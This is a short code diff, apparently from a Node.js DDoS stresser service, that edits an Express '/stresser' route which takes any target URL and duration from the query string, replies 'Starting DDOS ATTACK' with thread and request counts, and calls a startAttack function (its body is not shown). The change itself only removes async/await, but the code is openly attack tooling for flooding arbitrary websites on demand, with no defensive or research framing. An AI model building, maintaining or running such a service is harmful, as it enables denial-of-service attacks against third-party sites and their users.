@@ -281,7 +281,7 @@ const startAttack = (url, durationHours) => {
     return true;
 };
 
-app.get("/stresser", async (req, res) => {
+app.get("/stresser", (req, res) => {
     const url = req.query.url;
     const durationHours = parseFloat(req.query.duration) || 1;
 
@@ -292,7 +292,7 @@ app.get("/stresser", async (req, res) => {
         return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
     }
 
-    await res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD * 2} requests per batch...` });
+    res.json({ message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${REQUESTS_PER_THREAD * 2} requests per batch...` });
     startAttack(url, durationHours);
 });
 
